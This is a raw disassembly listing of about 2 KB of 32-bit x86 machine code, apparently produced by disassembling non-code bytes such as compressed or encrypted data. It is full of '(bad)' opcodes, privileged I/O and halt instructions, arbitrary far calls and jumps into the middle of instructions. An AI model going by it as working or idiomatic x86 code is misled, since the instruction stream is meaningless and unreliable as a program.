  40921c:	mov    cl,0x60
  40921e:	fisttp QWORD PTR [eax+0xf26e722]
  409224:	stos   DWORD PTR es:[edi],eax
  409225:	out    0x9a,eax
  409227:	fwait
  409228:	mov    DWORD PTR [ebx],edi
  40922a:	mov    ebp,0xd320959f
  40922f:	addr16 inc ebx
  409231:	je     0x40928f
  409233:	daa    
  409234:	(bad)  
  409235:	fisttp DWORD PTR [edx+0x7f]
  409238:	push   0xffffffaf
  40923a:	adc    cl,BYTE PTR [edx-0x7]
  40923d:	inc    ecx
  40923e:	jnp    0x40928a
  409240:	sub    ah,BYTE PTR [ebp+0x780f23f8]
  409246:	std    
  409247:	test   al,0x9d
  409249:	jno    0x4092ba
  40924b:	push   ecx
  40924c:	call   0x763d57a5
  409251:	pop    ebp
  409252:	out    0xeb,eax
  409254:	ret    
  409255:	shl    edi,cl
  409257:	sar    BYTE PTR [edi],1
  409259:	cli    
  40925a:	push   esi
  40925b:	jne    0x409288
  40925d:	lds    edx,FWORD PTR [eax]
  40925f:	add    ah,bh
  409261:	jge    0x409248
  409263:	hlt    
  409264:	das    
  409265:	mov    ah,0x17
  409267:	sub    bl,cl
  409269:	sbb    eax,0xf5f21f5
  40926e:	arpl   di,di
  409270:	shl    DWORD PTR [esi],1
  409272:	xor    bl,cl
  409274:	leave  
  409275:	sti    
  409276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409277:	xor    DWORD PTR ds:0xfe7f59ef,edx
  40927d:	sub    edx,DWORD PTR [ebx+0x166c6e37]
  409283:	jo     0x409239
  409285:	call   0x44bb:0x2e2c2172
  40928c:	xchg   ecx,eax
  40928d:	jecxz  0x40930a
  40928f:	enter  0x9179,0x12
  409293:	pusha  
  409294:	pop    ds
  409295:	fbld   TBYTE PTR [edi]
  409297:	pusha  
  409298:	cmp    BYTE PTR [edx-0x4c],al
  40929b:	pop    ecx
  40929c:	add    BYTE PTR [eax-0x5ac8c77b],bh
  4092a2:	cmp    al,0x3e
  4092a4:	scas   al,BYTE PTR es:[edi]
  4092a5:	xchg   esp,eax
  4092a6:	cmp    eax,0xd41c4f4c
  4092ab:	or     dh,BYTE PTR ds:[eax+0x34e6cb8e]
  4092b2:	lea    ebx,[edx-0x395d3419]
  4092b8:	pop    edi
  4092b9:	inc    DWORD PTR [ecx-0x2b]
  4092bc:	js     0x409256
  4092be:	sbb    dl,al
  4092c0:	imul   ebp,edx,0xb
  4092c3:	hlt    
  4092c4:	or     DWORD PTR [esi],edi
  4092c6:	mov    ah,bh
  4092c8:	mov    cl,0x78
  4092ca:	inc    eax
  4092cb:	mov    eax,0xa91d0772
  4092d0:	mov    dl,0x4f
  4092d2:	mov    ebx,0x2d4cb250
  4092d7:	and    dh,BYTE PTR [ebx-0x73158a8e]
  4092dd:	adc    ebx,DWORD PTR [ebp+0x2b99c31b]
  4092e3:	outs   dx,DWORD PTR ds:[esi]
  4092e4:	cmc    
  4092e5:	bnd jl 0x4092e5
  4092e8:	xor    al,BYTE PTR [ebx-0x63b45bc8]
  4092ee:	(bad)  
  4092ef:	in     eax,0xfd
  4092f1:	jae    0x40927f
  4092f3:	dec    ebx
  4092f4:	ja     0x4092a4
  4092f6:	scas   al,BYTE PTR es:[edi]
  4092f7:	push   0xffffffcd
  4092f9:	or     DWORD PTR [eax],edi
  4092fb:	pusha  
  4092fc:	in     eax,dx
  4092fd:	enter  0xa234,0x17
  409301:	mov    eax,0x8391236d
  409306:	imul   ebp,DWORD PTR [edi-0x3b],0x1ccd1a95
  40930d:	test   al,0x9
  40930f:	shr    DWORD PTR ds:0x4b687816,0xb8
  409316:	mov    al,ds:0x991be7c6
  40931b:	jp     0x409351
  40931d:	push   ebp
  40931e:	push   ecx
  40931f:	xor    eax,0xa246ac74
  409324:	addr16 or ebp,edx
  409327:	sbb    eax,0xc243807c
  40932c:	aad    0x4
  40932e:	mov    ebx,0x3b727974
  409333:	ror    DWORD PTR [eax-0x387a6698],1
  409339:	fsubr  DWORD PTR [ebx+0x36]
  40933c:	add    edx,eax
  40933e:	cmp    dl,BYTE PTR [ecx]
  409340:	dec    esp
  409341:	jbe    0x40932f
  409343:	popf   
  409344:	(bad)  
  409345:	hlt    
  409346:	mov    dh,0x73
  409348:	cs adc cl,0x29
  40934c:	in     al,0x25
  40934e:	lds    ecx,FWORD PTR [ebp+ecx*1+0x43]
  409352:	imul   eax,eax,0x4
  409355:	mov    eax,ds:0xac4e4508
  40935a:	(bad)  
  40935b:	and    bh,BYTE PTR [eax+0x1297eed]
  409361:	ret    
  409362:	pop    ss
  409363:	jecxz  0x409359
  409365:	mov    ds:0xa6a5215d,al
  40936a:	ins    DWORD PTR es:[edi],dx
  40936b:	push   cs
  40936c:	sbb    cl,ch
  40936e:	jno    0x4093e0
  409370:	lods   eax,DWORD PTR ds:[esi]
  409371:	js     0x4093b4
  409373:	adc    DWORD PTR [edx],eax
  409375:	pop    ecx
  409376:	rcr    BYTE PTR [ecx-0x79],1
  409379:	sub    DWORD PTR [ecx],ebx
  40937b:	sub    eax,0x9e2f14d4
  409380:	test   al,0x72
  409382:	ins    BYTE PTR es:[edi],dx
  409383:	or     al,BYTE PTR [edx]
  409385:	mov    eax,ds:0x90601129
  40938a:	fimul  WORD PTR [edi*4-0x1fb267f6]
  409391:	in     eax,0x1c
  409393:	mov    eax,0xa4fa1f70
  409398:	stos   DWORD PTR es:[edi],eax
  409399:	imul   edx,ecx,0xfffffff8
  40939c:	dec    ebp
  40939d:	or     eax,0x2db7a1fa
  4093a2:	jnp    0x4093ca
  4093a4:	repnz dec edi
  4093a6:	mul    DWORD PTR [edx+edx*4+0x2955c6ce]
  4093ad:	mov    edx,0x6ea3a52b
  4093b2:	and    al,0x40
  4093b4:	addr16 pop edi
  4093b6:	sbb    ebp,ebp
  4093b8:	arpl   WORD PTR [esi-0x67],si
  4093bb:	jmp    0x4093b1
  4093bd:	cmp    bl,BYTE PTR [edx+ecx*8-0x5c]
  4093c1:	dec    esi
  4093c2:	dec    edi
  4093c3:	stos   DWORD PTR es:[edi],eax
  4093c4:	xor    edi,DWORD PTR [eax+0x7]
  4093c7:	fstp   DWORD PTR [ebp-0x70]
  4093ca:	daa    
  4093cb:	xor    edi,DWORD PTR [edi+0x7b41e49a]
  4093d1:	and    ch,bh
  4093d3:	xchg   edx,eax
  4093d4:	cld    
  4093d5:	(bad)  [edx]
  4093d7:	or     ch,BYTE PTR [esi-0x13]
  4093da:	xchg   ecx,eax
  4093db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093dc:	or     ah,ah
  4093de:	cmc    
  4093df:	inc    esp
  4093e0:	mov    WORD PTR [edi+edx*1-0x689f618f],es
  4093e7:	pop    ss
  4093e8:	int3   
  4093e9:	call   0x89d91ef2
  4093ee:	mov    ecx,0x70b09ee1
  4093f3:	adc    dh,BYTE PTR [esi+0x44]
  4093f6:	aam    0x4a
  4093f8:	retf   
  4093f9:	jecxz  0x4093a7
  4093fb:	mov    dl,0x66
  4093fd:	fidiv  DWORD PTR [ebp+0x6c0aead0]
  409403:	cwde   
  409404:	(bad)  
  409405:	test   eax,0x3ca70fa5
  40940a:	nop
  40940b:	xchg   edi,eax
  40940c:	add    eax,0x67fd80d2
  409411:	xor    BYTE PTR [ecx-0x1b],bl
  409414:	retf   
  409415:	sub    al,0x2b
  409417:	cs pop ebx
  409419:	sbb    ah,BYTE PTR [esi+0x5a]
  40941c:	mov    edx,0x812c75ad
  409421:	or     BYTE PTR [ebx+0x38ff905f],dh
  409427:	jp     0x40942e
  409429:	repnz sbb eax,0xd7d84e37
  40942f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409430:	jmp    0x4093eb
  409432:	int    0x6d
  409434:	jle    0x4093b8
  409436:	ror    DWORD PTR [ecx+0x5816afb1],1
  40943c:	lods   eax,DWORD PTR ds:[esi]
  40943d:	(bad)  
  40943e:	sti    
  40943f:	cmp    al,0xcf
  409441:	push   esp
  409442:	sar    eax,0x9a
  409445:	test   BYTE PTR [edx+edx*4],0xde
  409449:	mov    ebx,0xa26fc7c8
  40944e:	aad    0x74
  409450:	mov    ebp,0x1a1a8a57
  409455:	pushw  cs
  409457:	int    0x14
  409459:	mov    esi,0xe7a9560f
  40945e:	loop   0x40946d
  409460:	mov    esp,0x89e650e6
  409465:	xor    esp,esp
  409467:	retf   
  409468:	jb     0x40945d
  40946a:	and    ch,BYTE PTR [edi-0x7d]
  40946d:	leave  
  40946e:	mov    WORD PTR [eax-0x7a63b35f],ds
  409474:	shl    BYTE PTR [esi],0x32
  409477:	mov    bh,0xbd
  409479:	push   edi
  40947a:	clc    
  40947b:	dec    edi
  40947c:	pop    edi
  40947d:	jecxz  0x409487
  40947f:	xchg   esi,eax
  409480:	mov    al,0x8c
  409482:	rcl    BYTE PTR [eax+0x29],0xd9
  409486:	(bad)  
  409487:	xor    BYTE PTR [eax],bl
  409489:	cmp    al,0x17
  40948b:	sub    BYTE PTR ds:0x2f16a65b,cl
  409491:	jb     0x409498
  409493:	jb     0x40945a
  409495:	lock aaa 
  409497:	inc    ebx
  409498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409499:	mov    esi,0x270e22e6
  40949e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094a0:	aad    0x6
  4094a2:	sub    eax,0x657cfc7d
  4094a7:	push   eax
  4094a8:	cmp    esi,DWORD PTR [eax+edx*2-0x5a]
  4094ac:	dec    ecx
  4094ad:	arpl   bp,cx
  4094af:	(bad)  
  4094b0:	loopne 0x409470
  4094b2:	push   ebp
  4094b3:	(bad)  
  4094b4:	jae    0x409493
  4094b6:	shl    DWORD PTR [ebp+0x6897cd0f],1
  4094bc:	or     DWORD PTR ds:0x3823dec4,ebx
  4094c2:	mov    esi,0x2cdd1249
  4094c7:	mov    al,0x96
  4094c9:	inc    esi
  4094ca:	and    eax,0x2290ab68
  4094cf:	push   edi
  4094d0:	cwde   
  4094d1:	adc    al,0xcf
  4094d3:	jno    0x40949e
  4094d5:	adc    eax,0x3a68acc2
  4094da:	adc    eax,0x1899b5d8
  4094df:	mov    cl,0x4c
  4094e1:	test   BYTE PTR [eax],0xce
  4094e4:	dec    edi
  4094e5:	mov    esi,0x79f34d7a
  4094ea:	adc    DWORD PTR [ebp+ebp*2+0x256c217c],0xffffff84
  4094f2:	jae    0x4094c5
  4094f4:	mov    ?,WORD PTR [ebx-0x4b13c898]
  4094fa:	add    dl,bl
  4094fc:	lods   al,BYTE PTR ds:[esi]
  4094fd:	(bad)  
  4094fe:	jns    0x4094f8
  409500:	pop    esi
  409501:	mov    ecx,0xf5951c8e
  409506:	sub    ch,0x4
  409509:	pop    esi
  40950a:	ret    
  40950b:	and    DWORD PTR [ecx-0x23cf868],0xcf000a9
  409515:	adc    al,BYTE PTR [eax-0x1893cef5]
  40951b:	fisub  DWORD PTR [ecx-0x78576b65]
  409521:	push   0x4350a66b
  409526:	ror    BYTE PTR [esi+esi*1-0x54],cl
  40952a:	imul   ebx,DWORD PTR [edx+0x51c540f1],0xa2c38281
  409534:	push   ecx
  409535:	not    DWORD PTR [esi-0x4f]
  409538:	or     al,0x55
  40953a:	xchg   edx,eax
  40953b:	inc    edi
  40953c:	push   edx
  40953d:	daa    
  40953e:	cld    
  40953f:	xor    ecx,edi
  409541:	mov    WORD PTR [ebx-0x4258c51e],fs
  409547:	adc    dh,al
  409549:	sbb    eax,0xe3a1ef98
  40954e:	add    DWORD PTR [edi+0x8],edi
  409551:	cli    
  409552:	sbb    bh,bl
  409554:	or     esi,DWORD PTR [eax]
  409556:	icebp  
  409557:	icebp  
  409558:	mov    BYTE PTR [edi+0x6852240e],cl
  40955e:	aas    
  40955f:	or     DWORD PTR [esi-0x2a],eax
  409562:	lea    eax,[eax-0x22]
  409565:	call   0x18d010fc
  40956a:	pushf  
  40956b:	jo     0x40956b
  40956d:	je     0x40950a
  40956f:	pop    ecx
  409570:	scas   eax,DWORD PTR es:[edi]
  409571:	popf   
  409572:	mov    dh,0x22
  409574:	xchg   BYTE PTR [edi],ah
  409576:	aas    
  409577:	cmp    BYTE PTR [ecx+0x74],0x13
  40957b:	xor    dh,cl
  40957d:	inc    ecx
  40957e:	clc    
  40957f:	loop   0x409587
  409581:	jo     0x4095ba
  409583:	fs sbb al,0xd3
  409586:	inc    ebp
  409587:	dec    edx
  409588:	call   0x1489:0x22ff00cd
  40958f:	mov    DWORD PTR [edx-0x43630d1],edi
  409595:	clc    
  409596:	mov    al,BYTE PTR [ecx+0x3674340b]
  40959c:	push   ss
  40959d:	push   eax
  40959e:	pop    ds
  40959f:	add    edi,0x4b
  4095a2:	out    0x27,al
  4095a4:	or     ebp,DWORD PTR [eax-0x45f9e777]
  4095aa:	cmp    eax,0xf1c83482
  4095af:	outs   dx,DWORD PTR ds:[esi]
  4095b0:	enter  0x4375,0x41
  4095b4:	ins    BYTE PTR es:[edi],dx
  4095b5:	xchg   DWORD PTR [ebp-0x310cd26c],edi
  4095bb:	add    ecx,DWORD PTR [ecx-0x7c]
  4095be:	mov    dh,0xb6
  4095c0:	leave  
  4095c1:	pop    ecx
  4095c2:	or     eax,0x1fcd1f78
  4095c7:	mov    eax,0x247d9f21
  4095cc:	fsub   DWORD PTR [esi-0x73]
  4095cf:	js     0x4095cd
  4095d1:	inc    edx
  4095d2:	fmul   DWORD PTR [edx]
  4095d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d5:	mov    dh,0xbc
  4095d7:	mov    edx,0xf800c4b6
  4095dc:	ficom  WORD PTR [esi]
  4095de:	push   eax
  4095df:	sar    bl,cl
  4095e1:	retf   0xf75d
  4095e4:	(bad)  
  4095e6:	ffreep st(3)
  4095e8:	cmp    BYTE PTR [edi+eiz*1],ah
  4095eb:	mov    dh,0x48
  4095ed:	adc    BYTE PTR [ebx],al
  4095ef:	jns    0x4095e1
  4095f1:	scas   al,BYTE PTR es:[edi]
  4095f2:	adc    DWORD PTR [esi+0x7a3c031],eax
  4095f8:	arpl   WORD PTR [edx+0x77c76a39],bx
  4095fe:	and    BYTE PTR [edi],dl
  409600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409601:	and    cl,BYTE PTR [ebp+0x5d02f0bf]
  409607:	lods   al,BYTE PTR ds:[esi]
  409608:	dec    edi
  409609:	out    0x67,al
  40960b:	pop    ebx
  40960c:	jnp    0x4095ab
  40960e:	xor    BYTE PTR [eax-0x6],0xdc
  409612:	pop    ecx
  409613:	(bad)  
  409615:	mov    eax,ds:0x2c5e96bd
  40961a:	ror    BYTE PTR [ecx+ebx*4],cl
  40961d:	push   ds
  40961e:	or     dl,BYTE PTR [eax-0x6c37c761]
  409624:	scas   al,BYTE PTR es:[edi]
  409625:	xchg   ebx,eax
  409626:	fisttp WORD PTR [ecx]
  409628:	pusha  
  409629:	or     eax,0x90d7ed1
  40962e:	push   ecx
  40962f:	mov    dh,cl
  409631:	or     al,0xaf
  409633:	ror    BYTE PTR ss:[edi-0x16f3500b],0xe0
  40963b:	inc    edi
  40963c:	jb     0x409689
  40963e:	jge    0x409690
  409640:	mov    dh,0xed
  409642:	xchg   edi,eax
  409643:	cmp    DWORD PTR [edi+0x44],ecx
  409646:	fwait
  409647:	pop    ds
  409648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409649:	mov    DWORD PTR ds:[ebp+0x7991d490],eax
  409650:	daa    
  409651:	in     al,dx
  409652:	(bad)  
  409653:	mov    edi,edi
  409655:	rcr    DWORD PTR [ebp+0x4e],cl
  409658:	adc    edx,ecx
  40965a:	and    DWORD PTR [edx+0x768648c0],edx
  409660:	icebp  
  409661:	pushf  
  409662:	cmc    
  409663:	je     0x4095ed
  409665:	add    al,BYTE PTR [ecx+0x12f5f876]
  40966b:	in     al,0xaa
  40966d:	inc    eax
  40966e:	jb     0x409699
  409670:	sti    
  409671:	outs   dx,BYTE PTR ds:[esi]
  409672:	retf   0xcd3c
  409675:	sub    DWORD PTR [ecx+0x1a],0x3667887e
  40967c:	jecxz  0x4096bb
  40967e:	repz mov ebx,0x54fefdf1
  409684:	sub    al,0x2c
  409686:	push   es
  409687:	daa    
  409688:	cmp    al,0x4a
  40968a:	add    edi,esp
  40968c:	mov    cl,0x4d
  40968e:	int    0x98
  409690:	and    ch,BYTE PTR [ebx-0x56]
  409693:	xchg   BYTE PTR [ecx+0x1dd1c5cf],cl
  409699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40969a:	and    bl,ah
  40969c:	xchg   ebp,eax
  40969d:	(bad)  
  40969f:	xor    esi,DWORD PTR [esi+0x69]
  4096a2:	retf   
  4096a3:	sub    BYTE PTR [eax+0x52],bl
  4096a6:	pop    edx
  4096a7:	adc    al,0x14
  4096a9:	or     ebx,DWORD PTR [ecx]
  4096ab:	sahf   
  4096ac:	outs   dx,DWORD PTR ds:[esi]
  4096ad:	push   cs
  4096ae:	adc    al,0xbb
  4096b0:	pop    ss
  4096b1:	bound  esp,QWORD PTR [edx+0x7e]
  4096b4:	outs   dx,BYTE PTR ds:[esi]
  4096b5:	pop    edi
  4096b6:	inc    edi
  4096b7:	loop   0x409728
  4096b9:	adc    DWORD PTR [esi],0x6e27ede4
  4096bf:	(bad)  
  4096c0:	jmp    0x409724
  4096c2:	xchg   edx,eax
  4096c3:	xchg   ecx,eax
  4096c4:	ret    0x8ded
  4096c7:	push   0xffffffe8
  4096c9:	pusha  
  4096ca:	mul    BYTE PTR [ebp-0x2c]
  4096cd:	cmp    BYTE PTR [ebx+edx*8+0x0],0x1b
  4096d2:	mov    edi,0x58621390
  4096d7:	pop    edi
  4096d8:	sar    BYTE PTR [esi],1
  4096da:	aad    0xff
  4096dc:	popa   
  4096dd:	jbe    0x409674
  4096df:	test   BYTE PTR ds:[eax+0x1c1cda96],cl
  4096e6:	dec    BYTE PTR fs:[ebx+0x7]
  4096ea:	jmp    0xb3c9476e
  4096ef:	push   eax
  4096f0:	jb     0x40967f
  4096f2:	sbb    al,0x43
  4096f4:	adc    eax,DWORD PTR [esi+0x79]
  4096f7:	dec    ebp
  4096f8:	repz pop esp
  4096fa:	mov    eax,ds:0x1a050c5a
  4096ff:	pop    ecx
  409700:	shl    BYTE PTR [ebx+0x481d3f2],cl
  409706:	test   BYTE PTR [ecx-0x7ee37cb1],0xa8
  40970d:	jb     0x40977a
  40970f:	js     0x40971a
  409711:	stos   DWORD PTR es:[edi],eax
  409712:	push   esp
  409713:	imul   BYTE PTR [edi-0x3b8974a7]
  409719:	pop    ss
  40971a:	push   ds
  40971b:	loope  0x409742
  40971d:	dec    ebp
  40971e:	sub    BYTE PTR [ecx-0x5d],dl
  409721:	outs   dx,DWORD PTR ds:[esi]
  409722:	dec    ebp
  409723:	push   edi
  409724:	xchg   edi,eax
  409725:	add    eax,0x2273eeb3
  40972a:	add    eax,0x24a16a39
  40972f:	add    ebp,DWORD PTR [edx+eax*8+0x1eeb0cbe]
  409736:	cmp    eax,ebp
  409738:	add    al,0x7d
  40973a:	int    0x6e
  40973c:	sbb    ecx,DWORD PTR [ebp+eax*1+0x122683dc]
  409743:	sub    edx,ecx
  409745:	cdq    
  409746:	push   esi
  409747:	lahf   
  409748:	mov    dh,0xee
  40974a:	mov    esi,0xb20d849a
  40974f:	leave  
  409750:	fwait
  409751:	pushf  
  409752:	mov    BYTE PTR [eax+ecx*2],al
  409755:	xor    DWORD PTR [ebx],ecx
  409757:	call   0xd2cf7cae
  40975c:	rcl    DWORD PTR [eax],cl
  40975e:	pop    eax
  40975f:	es mov ebp,0xf1b894ae
  409765:	out    0xdb,eax
  409767:	sar    edx,0xa0
  40976a:	mov    al,ds:0x3bed5378
  40976f:	nop
  409770:	pop    ebp
  409771:	pop    esi
  409772:	mov    es,ecx
  409774:	mov    al,0xa
  409776:	jp     0x409786
  409778:	push   esp
  409779:	push   eax
  40977a:	icebp  
  40977b:	repnz push ecx
  40977d:	pop    ebp
  40977e:	rcr    esi,cl
  409780:	out    0xe0,al
  409782:	mov    edi,0x20beccb4
  409787:	inc    esp
  409788:	or     bh,BYTE PTR [edi-0x6b]
  40978b:	test   DWORD PTR [eax+ecx*4+0x3f0d196b],ebx
  409792:	call   0x80cd6f72
  409797:	add    eax,0xf474317
  40979c:	scas   eax,DWORD PTR es:[edi]
  40979d:	mov    ch,0xd8
  40979f:	xor    BYTE PTR [eax+0x1a],0x4e
  4097a3:	repnz ds nop
  4097a6:	je     0x409744
  4097a8:	idiv   dl
  4097aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ab:	in     al,dx
  4097ac:	popa   
  4097ad:	adc    ebp,DWORD PTR [edi+0x3e42dfc9]
  4097b3:	addr16 xor al,0x68
  4097b6:	pushf  
  4097b7:	in     al,0x12
  4097b9:	out    0x44,eax
  4097bb:	adc    ecx,DWORD PTR [ecx-0x22199aec]
  4097c1:	lds    esp,FWORD PTR [esi-0x17]
  4097c4:	xor    ah,bl
  4097c6:	stos   DWORD PTR es:[edi],eax
  4097c7:	(bad)  
  4097c8:	jb     0x4097fb
  4097ca:	outs   dx,BYTE PTR ds:[esi]
  4097cb:	jo     0x4097b1
  4097cd:	bound  ecx,QWORD PTR [edx-0x7999d3b9]
  4097d3:	push   ds
  4097d4:	in     eax,dx
  4097d5:	push   0x5a2b26f0
  4097da:	inc    edi
  4097db:	mov    ecx,0xe3f16b74
  4097e0:	jge    0x4097b8
  4097e2:	push   esp
  4097e3:	imul   ebx,esi,0xffffffd7
  4097e6:	ret    0xabd9
  4097e9:	outs   dx,BYTE PTR ds:[esi]
  4097ea:	mul    BYTE PTR [edi+0x6c]
  4097ed:	jne    0x409853
  4097ef:	pop    eax
  4097f0:	pop    ds
  4097f1:	mov    ebp,0x1650c0be
  4097f6:	adc    BYTE PTR [esi+0x4349e54f],ch
  4097fc:	jns    0x409846
  4097fe:	aas    
  4097ff:	sbb    ebx,DWORD PTR [ebx+0x50]
  409802:	mov    eax,DWORD PTR [esi+eiz*2]
  409805:	rcr    ecx,cl
  409807:	and    al,0xf3
  409809:	push   edx
  40980a:	hlt    
  40980b:	and    al,0x99
  40980d:	mov    edx,0xa3f5ce6b
  409812:	jb     0x409830
  409814:	push   eax
  409815:	test   BYTE PTR ds:[edi-0xd752230],al
  40981c:	loope  0x40979e
  40981e:	add    eax,DWORD PTR ds:0x8f09f890
  409824:	add    eax,0x165760e7
  409829:	imul   ecx,esp,0x7486ab18
  40982f:	(bad)  
  409830:	jbe    0x409829
  409832:	ret    0xcfdd
  409835:	xchg   edi,eax
  409836:	sub    eax,edi
  409838:	call   0xeaae:0xfd8ad33b
  40983f:	xchg   ecx,eax
  409840:	and    bl,BYTE PTR [esp+eiz*4]
  409843:	jnp    0x409894
  409845:	dec    eax
  409846:	sub    BYTE PTR [edi],cl
  409848:	sbb    BYTE PTR [eax],ch
  40984a:	(bad)  
  40984b:	stos   DWORD PTR es:[edi],eax
  40984c:	pop    es
  40984d:	dec    esi
  40984e:	pop    edi
  40984f:	mov    bh,0x4e
  409851:	push   ebp
  409852:	imul   edi,DWORD PTR [ebp+0x158eb364],0x8fac363f
  40985c:	int    0xf2
  40985e:	xor    al,0x50
  409860:	daa    
  409861:	xor    bl,BYTE PTR [ebx]
  409863:	scas   al,BYTE PTR es:[edi]
  409864:	push   esi
  409865:	mul    cl
  409867:	inc    DWORD PTR [eiz*8-0x5b3937a3]
  40986e:	sub    BYTE PTR [ecx+0x740379f5],bl
  409874:	jne    0x4098e7
  409876:	hlt    
  409877:	iret   
  409878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409879:	lds    eax,FWORD PTR [edx-0x1ed43be0]
  40987f:	mov    al,bl
  409881:	mov    bh,0x9e
  409883:	scas   eax,DWORD PTR es:[edi]
  409884:	(bad)  
  409885:	mov    ?,WORD PTR [ecx-0x58fd38d6]
  40988b:	xor    BYTE PTR [ebp-0x19],0xc8
  40988f:	xor    BYTE PTR [edi-0x22967a47],dl
  409895:	loopne 0x409878
  409897:	ins    BYTE PTR es:[edi],dx
  409898:	push   ebp
  409899:	fld    DWORD PTR [ebx+0x3]
  40989c:	ins    BYTE PTR es:[edi],dx
  40989d:	jecxz  0x409831
  40989f:	mov    ebx,0x54caaa3c
  4098a4:	and    al,0xb4
  4098a6:	cmp    edi,DWORD PTR ds:0xca3a6e51
  4098ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098ad:	(bad)  
  4098ae:	cmp    eax,0xbd46efb1
  4098b3:	mov    eax,ds:0x7a3055fb
  4098b8:	pusha  
  4098b9:	aam    0x5d
  4098bb:	adc    ebp,DWORD PTR [si+0x7f27]
  4098c0:	std    
  4098c1:	xchg   edi,eax
  4098c2:	cld    
  4098c3:	dec    esi
  4098c4:	sbb    cl,BYTE PTR [eax-0x1bd751ca]
  4098ca:	ficomp DWORD PTR [edx+0x776837d0]
  4098d0:	cmc    
  4098d1:	out    0xc3,eax
  4098d3:	rcl    BYTE PTR es:[edx],0xf
  4098d7:	mov    eax,ds:0x3b3b1af
  4098dc:	outs   dx,BYTE PTR ds:[esi]
  4098dd:	adc    al,BYTE PTR [eax]
  4098df:	int    0x7e
  4098e1:	gs aam 0xa2
  4098e4:	push   esp
  4098e5:	data16 sbb cl,BYTE PTR [edx-0x6b9ce82d]
  4098ec:	mov    edx,0xd68e5e05
  4098f1:	push   es
  4098f2:	pop    es
  4098f3:	xchg   edx,eax
  4098f4:	and    BYTE PTR [ecx],dh
  4098f6:	sar    BYTE PTR [esi-0x36],cl
  4098f9:	lock pop esi
  4098fb:	push   eax
  4098fc:	ins    BYTE PTR es:[edi],dx
  4098fd:	repnz outs dx,BYTE PTR ds:[esi]
  4098ff:	imul   ebp,DWORD PTR [edi+edi*8],0xd3665fc8
  409906:	ins    DWORD PTR es:[edi],dx
  409907:	cmp    BYTE PTR [eax-0x35800d57],bh
  40990d:	mov    cl,0xda
  40990f:	cdq    
  409910:	xlat   BYTE PTR ds:[ebx]
  409911:	push   ebp
  409912:	inc    ecx
  409913:	mov    BYTE PTR [ebx-0x1e6d3d0],cl
  409919:	add    al,0x84
  40991b:	out    0xf2,eax
  40991d:	xchg   ecx,ebp
  40991f:	dec    eax
  409920:	in     eax,0x1d
  409922:	arpl   WORD PTR [ecx],bx
  409924:	mov    eax,ds:0xb590d64f
  409929:	add    al,0x6f
  40992b:	add    al,0x27
  40992d:	jge    0x40991a
  40992f:	jae    0x4099ad
  409931:	push   ebx
  409932:	xchg   edi,eax
  409933:	shl    ebx,0x19
  409936:	ret    0xf6d9
  409939:	mov    bh,BYTE PTR [eax+0x1a6e158c]
  40993f:	test   eax,0xd12bfbd
  409944:	ss dec edi
  409946:	adc    al,0xd2
  409948:	mov    DWORD PTR [edx],eax
  40994a:	pop    edx
  40994b:	mov    bl,0x1e
  40994d:	scas   eax,DWORD PTR es:[edi]
  40994e:	inc    eax
  40994f:	mov    eax,esi
  409951:	fsub   DWORD PTR [esi-0x4d21d4bb]
  409957:	dec    esi
  409958:	scas   al,BYTE PTR es:[edi]
  409959:	int    0x75
  40995b:	adc    al,0xc9
  40995d:	fcom   DWORD PTR [eax]
  40995f:	jg     0x40994f
  409961:	mov    ebp,0xca37e0af
  409966:	add    BYTE PTR [esi],0x95
  409969:	sub    eax,0x50b497ae
  40996e:	ja     0x40993d
  409970:	or     cl,bl
  409972:	ds clc 
  409974:	popa   
  409975:	popf   
  409976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409977:	out    dx,al
  409978:	iret   
  409979:	aam    0x82
  40997b:	ds pop esi
  40997d:	jno    0x4099ab
  40997f:	xor    al,0xd8
  409981:	test   eax,0x1af10fc
  409986:	std    
  409987:	lahf   
  409988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409989:	dec    edi
  40998a:	repz sub eax,0x290af3e2
  409990:	add    esi,esp
  409992:	outs   dx,DWORD PTR ds:[esi]
  409993:	push   ebx
  409994:	mov    ds:0xc0c3fba5,eax
  409999:	dec    ecx
  40999a:	loopne 0x40996c
  40999c:	jo     0x4099f4
  40999e:	and    ah,BYTE PTR [esp+ecx*8+0x7f]
  4099a2:	xor    al,0xc4
  4099a4:	div    DWORD PTR [ecx-0x2c]
  4099a7:	push   esi
  4099a8:	gs or  eax,0xb4bc8e31
  4099ae:	aam    0x99
  4099b0:	dec    edi
  4099b1:	xchg   edx,eax
  4099b2:	ror    DWORD PTR [ecx+0x387ef3ae],1
  4099b8:	adc    ah,BYTE PTR [ecx+0x4c]
  4099bb:	fadd   st(0),st
  4099bd:	dec    edi
  4099be:	sar    DWORD PTR [edx-0x7473e700],cl
  4099c4:	repnz cmc 
  4099c6:	shl    BYTE PTR [ecx+0x4748807c],cl
  4099cc:	retf   0xb3fc
  4099cf:	stc    
  4099d0:	dec    ebp
  4099d1:	daa    
  4099d2:	pusha  
  4099d3:	movups XMMWORD PTR [edx+0x56e20e],xmm6
  4099da:	rcl    DWORD PTR [ecx],1
  4099dc:	stos   BYTE PTR es:[edi],al
  4099dd:	ins    DWORD PTR es:[edi],dx
  4099de:	xchg   edi,eax
  4099df:	or     al,0xd5
  4099e1:	scas   al,BYTE PTR es:[edi]
  4099e2:	or     eax,0x543546e
  4099e7:	das    
  4099e8:	push   ss
  4099e9:	out    0x24,eax
  4099eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099ec:	sub    DWORD PTR [edx+0x17d0b7de],edx
  4099f2:	pusha  
  4099f3:	call   0x8171:0x8b8a254e
  4099fa:	scas   eax,DWORD PTR es:[edi]
  4099fb:	push   ebx
  4099fc:	je     0x409a34
  4099fe:	xchg   ah,ah
  409a00:	mov    edi,0xe6c8ba19
